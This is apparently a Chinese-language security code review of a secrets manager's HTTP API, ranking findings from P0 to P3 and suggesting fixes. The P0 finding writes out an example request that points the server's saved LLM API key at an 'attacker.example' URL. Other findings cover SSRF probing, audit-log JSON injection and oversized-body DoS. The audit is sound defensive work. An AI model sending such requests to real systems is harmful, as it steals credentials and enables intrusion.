# HTTP API（api）代码审查报告

> 审查对象：`internal/api/`（api.go、admin.go、rotate.go、users.go、webui.go、aichat_api.go + 四个测试文件）
> 审查方式：逐文件通读全部 handler（共 33 个，含 importKeyhive 子流程），并交叉核实 internal/{store,auth,audit,model,crypto,aichat} 与 cmd/keyhive/main.go 的被依赖路径。
> 日期：2026-10-28。只读审查，未修改任何业务代码。

## 概览

范围：6 个源文件约 1483 行 + 4 个测试文件约 1910 行，是仓库最大的后端包。全部路由经 `Routes()`（api.go:56-112）挂载：登录三端点（login/logout/version）之外全部在 `RequireSession` 组内，管理操作叠加 `RequireAdmin`，路由分组本身没有漏守卫的端点。总体评价：这是一个安全意识明显高于平均水平的包——敏感值遮蔽纪律、令牌只存哈希、AI Key 加密落库、审计覆盖面都做得扎实，测试对错误分支的覆盖也罕见地细致。但存在一个跨越"管理员配置边界"的凭据外带问题（P0）和一个轮换期并发写导致密文永久损坏的竞态（P1），都属于必须在下次发版前处理的问题；其余为加固类发现。

## 发现清单

### P0（1 条）

**[P0] `/ai-config/test`、`/ai-config/models` 对普通用户开放 + 已保存 Key 回退 → 任意登录用户可将 LLM API Key 外带到任意 URL，兼作 SSRF 探测**（api.go:84-86；aichat_api.go:329-363、367-397；aichat_api.go 底层 aichat/aichat.go:343、aichat/models.go:81-83）

- 路由事实：api.go:83 注释写明"LLM 配置仅管理员"，但 `pr.Post("/ai-config/test", ...)` 与 `pr.Post("/ai-config/models", ...)` 挂在 `RequireSession` 普通用户组（api.go:84-86），只有 `PUT /ai-config` 在 admin 组（api.go:110）。测试（aichat_api_test.go）也全部以 admin 身份调用，掩盖了这一点。
- 外带路径：`handleAIConfigTest` 在请求的 `api_key` 为空或 `****` 前缀时，回退解密**已保存的管理员 Key**（aichat_api.go:341-354），随后把它拼进 `cfg`，而 `base_url` 完全取自请求体（aichat_api.go:356-361）。底层 `callLLM` 会向 `cfg.BaseURL + "/chat/completions"` 发送 `Authorization: Bearer <保存的 Key>`（aichat/aichat.go:337-343）；`handleAIListModels` 同理（`/models`，models.go:81-83；回退逻辑 aichat_api.go:377-384）。于是一段请求即可窃 Key：
  `POST /api/v1/ai-config/test  {"base_url":"https://attacker.example"}` → 服务器把真实 LLM Key 以 Bearer 头发给攻击者。
- SSRF 面：同一端点允许指定任意 `base_url` 由服务端发起 HTTP 请求（登录用户即可、无内网地址限制、仅 http/https 可用）；`/ai-config/models` 的错误串会回显目标响应体前 200 字符（models.go:59，非 200 时），连接错误亦区分 refused/timeout，构成对内网的存活/内容探测原语。
- 修复建议（任选其一或叠加）：① 把两个端点移入 admin 组；② 保留普通用户可用，但**回退已保存 Key 时强制 `base_url`/`protocol` 用已保存配置**，用户自填 Key 时才允许自填 URL；③ 如仍开放自填 URL，校验 scheme 并拒绝环回/私网段。测试应补"普通用户调用应 403（或 Key 不出已配置域名）"的用例。

### P1（1 条）

**[P1] 主密钥轮换与条目并发写无互斥：轮换窗口内新写条目永久无法解密、并发更新被静默回滚**（rotate.go:33；store.go:318-389）

- `RotateAllEntries` 的时序：① 读全部行（store.go:320-340，此刻仍用旧密钥解密）→ ③ 事务重写全部密文并提交（store.go:364-382）→ ④ 才替换内存密钥（store.go:384-388）。`Store.mu` 只保护 `Cipher` 指针的读写，整个轮换期间对 `CreateEntry/UpdateEntry` 没有任何写排他。
- 后果一（数据永久损坏）：用户在步骤①与④之间 `POST /entries`，条目用**旧密钥**加密落库且不在轮换快照里；轮换提交后内存密钥已是新钥，该条目从此解密失败——`GetEntry` 报错后 handler 统一按 404"条目不存在"返回（api.go:271-274），**秘密静默丢失且无告警**。
- 后果二（更新丢失/旧密文复活）：轮换期间 `PUT /entries/{id}` 的读-改-写在事务外交错，可能在轮换事务之后把旧钥密文写回（同样变 404），或在轮换事务之前提交而被快照覆盖（用户更新静默回滚）。
- 窗口不小：重加密全程（条目多时秒级到分钟级）都是危险期，而轮换恰恰是"管理员动手、系统照常使用"的运维时刻。
- 修复建议：给 `Store` 加写互斥——轮换全程持写锁、`CreateEntry/UpdateEntry/DeleteEntry/saveAsTemplate`（凡 encryptFields 路径）持读锁；或轮换期间置 `rotating` 标志对写端点返回 503 由前端重试。同时建议把"解密失败"与"条目不存在"区分开（至少 500 + 服务端日志），避免损坏被 404 掩盖。

### P2（4 条）

**[P2] 审计 detail 全部由字符串拼接构造 JSON，用户可控文本可注入/破坏审计记录**（api.go:264、280、302、321、352；admin.go:42、75、96、156；users.go:92、178-180、213；webui.go:60-61；aichat_api.go:190-195、288-294 —— 共约 15 处）

- 形如 `` `{"title":"`+e.Title+`"}` `` 的拼接，条目标题、模板名、用户名、甚至 LLM 生成的草稿标题（aichat_api.go:190）里含 `"`、`\` 时 detail 即为非法 JSON；含 `","admin_note":"` 之类可注入伪造键值。审计日志是密钥管理器的取证底线，其 detail 字段可被普通用户写坏/伪造属于完整性缺陷（无 SQL 注入风险，落库参数化）。
- 修复建议：统一改为 `json.Marshal(map[string]any{...})` 生成 detail（顺带解决全部 15 处）。

**[P2] 错误响应大量直接回显 `err.Error()` 原文，泄漏 SQL/内部细节**（api.go:118、242、258、315、359；admin.go:105、152、175、193、203；users.go:29、86、167、208；webui.go:179；aichat_api.go:185、393）

- 普通用户可达的 `GET /entries`（api.go:242）、`GET /categories`（api.go:359）、`POST /entries` 的 400（api.go:258，校验错误与 SQL 错误混用同一通道）、`POST /ai-chat` 的 502（aichat_api.go:185，回显上游错误含响应体片段）都会把 SQLite 错误原文（表名/约束名/驱动细节）回给客户端。管理员端点同样普遍（如 users.go:86 的 INSERT 错误原文）。rotate.go:53 的路径回显属于有意为之的运维提示，可豁免。
- 修复建议：500 一律给通用文案、err 记服务端日志；400 通道只透传 `Validate()` 类业务错误。

**[P2] 全站无请求体大小限制（含未认证的 `/auth/login`），未认证内存耗尽 DoS**（api.go:32-35；根因亦在 cmd/keyhive/main.go:142 未配任何 server 限制）

- `readBody` 直接 `json.NewDecoder(r.Body).Decode`，无 `http.MaxBytesReader`；`grep MaxBytesReader/ReadTimeout` 全仓为空。未认证攻击者向 `/auth/login` POST 一个数 GB 的 JSON 字符串值，解码过程即分配等量内存；`changePassword` 的超长密码还会进入 argon2 放大分配。`/import`（admin）同样无条目数/体积上限。
- 修复建议：在 `Routes` 顶层或 `readBody` 里包 `http.MaxBytesReader(w, r.Body, 4<<20)`；导入端点另行限制解析条数。

**[P2] `PUT /ai-config` 只在 api_key 变更时记审计，base_url/protocol/model 变更无审计；`PUT /settings/stale-days`、logout 全程无审计**（aichat_api.go:107-121；webui.go:169-183；api.go:172-185）

- `audit.Log` 埋在 `if req.APIKey 非空且非遮蔽` 分支内（aichat_api.go:118-119）：仅改 `base_url`（正是 P0 所述的 Key 外带路径——chat/test 都会把保存的 Key 发往 base_url）不留任何痕迹，事后审计无法回答"Key 是否可能被重定向过"。`model.ActionLogout` 常量已定义（model.go:174）但从未使用，logout/logout-all 不记审计。
- 修复建议：任何 settings 成功写入都记审计（detail 用 json.Marshal 列出本次变更的字段名即可，不必记值）；补 logout 审计。

### P3（6 条）

**[P3] `clientIP` 无条件信任 `X-Forwarded-For`，叠加 chi `middleware.RealIP`，直连场景审计 IP 可伪造**（api.go:37-47；cmd/keyhive/main.go:107）——攻击者可伪造审计日志中的来源 IP 混淆取证。建议加开关：未配置反代时不读 XFF（`middleware.RealIP` 同理）。

**[P3] `parseInt64`/`intQuery` 整数溢出回绕**（api.go:368-377；admin.go:211-223）——超长数字串（如 20+ 位）回绕成任意 int64，`/entries/99999999999999999999` 可能意外匹配某个真实 id（概率极低）；audit 的 limit 在 `audit.List` 内有 ≤200 封顶（audit.go:36-38）缓解了 limit 方向。建议改用 `strconv.ParseInt` 并显式拒绝溢出。

**[P3] 会话 Cookie 未设 `Secure`，且全站无 CSRF token**（api.go:162-168）——依赖 `SameSite=Lax` 防跨站写（POST 不带 cookie，够用），但 HTTP 明文部署下 cookie 可被链路嗅探；`?reveal=true` 是 GET，理论上可被顶层导航触发，但 JSON 响应跨域不可读，实际不可利用。按内网 HTTP 部署现状属低风险，建议至少支持 HTTPS 时补 `Secure`。

**[P3] check-then-act 竞态两处**：`createUser` 先 `SELECT COUNT` 再 INSERT（users.go:66-84），并发撞 `users.username UNIQUE`（db.go:39）时以 500 + SQL 原文收场；最后管理员护栏 `countAdmins` 与 UPDATE 之间（users.go:119-128、201-206）两个并发请求可同时通过检查，理论上可降光全部管理员。建议把护栏放进事务（`BEGIN IMMEDIATE`）或捕获唯一约束错误转 400。

**[P3] `is_secret` 字段值若以 `enc:v1:` 开头会被跳过加密原样落库**（store.go:44-55，经 api.go:251/288 的 create/update 暴露）——用户（或上游填充程序）提交 `value:"enc:v1:xxxx"` 的敏感字段时，存的是"伪密文"，后续读取必然解密失败（条目变 404），且明文形态入库违背"敏感必加密"不变量。建议 API 层拒绝 `enc:v1:` 前缀的入参值，仅保留给内部 rotate 预计算路径使用。

**[P3] `GET /ai-config` 对普通用户回显遮蔽 Key 尾 4 位与 base_url/model**（aichat_api.go:56-73，路由在普通组 api.go:84）——尾 4 位本身低危，但与 P0 同根源（配置可见性与管理边界不一致）；P0 修复时建议一并明确该端点的受众。

## 做得好的地方

1. **路由守卫纪律好**：除 login/logout/version 三个刻意公开的端点外无一裸奔；`RequireAdmin` 每请求实时查库校验 `is_admin/disabled`（middleware.go:26-47），降权/禁用即时生效，测试明确覆盖了"禁用后旧会话 401、降权后 403"。
2. **敏感值输出与存储纪律一致**：列表/详情/创建/更新响应一律 `MaskSecrets()`；reveal 是显式参数且逐次记审计（api.go:278-282）；API 令牌只存 SHA-256 哈希、明文仅创建响应一次（admin.go:149-158）；LLM API Key 加密落库、GET 遮蔽、`****` 前缀回传不覆盖（aichat_api.go:107-121）；saveAsTemplate 落库前清空字段值（store.go:283-286），"模板不带值"的注释与实现相符。
3. **rotateKey 的失败路径处理罕见地细致**：事务保证原子、失败明确告知"数据库已回滚，旧密钥仍有效"；密钥文件写失败时区分"内存已生效/未落盘"给出可执行恢复指引（rotate.go:52-54）；env/文件双模式各有测试；`key_check` 机制防止密钥与库错配启动。
4. **输入校验普遍到位且全参数化**：ID 非法统一 404（有表驱动测试）、stale_days 1-3650、scopes 白名单去重、expires RFC3339 校验、空标题/空字段名/重复字段名拒绝（model.Validate）；`updateUser` 动态 SET 只拼接固定列名，参数全部占位符，无 SQL 注入面；genTOTP 的 `field` 参数为 `FieldByKey` 精确匹配，无通配/注入问题。
5. **webui.go 的静态资源关注点实际不在此包**：SPA 静态服务在 cmd/keyhive/main.go:166-190，embed FS + `http.FileServer` 且无上传/下载端点，无路径穿越面；本包 webui.go 实为 version/TOTP/导入/阈值设置。

## 测试盲区

（"缺测试"不计为发现，以下为现有测试覆盖不到的风险点）

- **轮换期间并发写**：rotate 测试全部为串行（TestRotateKeyFileMode/EnvMode），无"轮换进行中并发 POST/PUT entries"的用例——正是 P1 所在。
- **AI 端点的权限面**：aichat_api_test.go 所有请求都以 admin 登录发起，从未用普通用户身份打 `/ai-config/test`、`/ai-config/models`、`GET /ai-config`——P0 因此漏网。
- **审计 detail 的注入**：无标题/模板名/用户名含 `"` 或 `\` 的操作用例，detail 非法 JSON 不会被现有断言发现。
- **超长/超大请求体**：无任何 body 尺寸与畸形超长输入（深嵌套 JSON、数 MB 字符串）的用例。
- **SSE 连接生命周期**：无"客户端断开后流式请求是否随 ctx 取消及时终止"的测试（当前实现依赖 `r.Context()` 传播，路径正确但无回归保护）。
- **并发护栏**：最后管理员保护与用户名唯一性均无并发用例（P3 的 TOCTOU）。
- **边缘输入**：`expires_at` 为过去时间可直接创建"生来即失效"的令牌（admin 自伤，无校验也无测试）；`?reveal=true` 之外的大小写变体（`True`）不生效属预期但无断言。
